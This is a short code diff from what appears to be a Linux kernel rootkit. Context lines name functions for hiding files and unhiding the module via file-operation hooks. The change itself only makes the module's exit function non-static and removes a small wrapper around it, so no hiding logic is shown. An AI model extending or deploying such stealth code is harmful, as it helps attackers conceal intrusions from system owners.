@@ -392,14 +392,9 @@ int unhide_file(const char *path_name) {
 	return free_fops_hook(inode);
 }
 
-static void MRK_exit(void) {
+void MRK_exit(void) {
     unhide_module();
 	printk(KERN_INFO "Goodbye, World!\n");
-}
-
-int exit_func(const char *_) {
-    MRK_exit();
-    return 0;
 }
 
 static int __init MRK_initialize(void) {
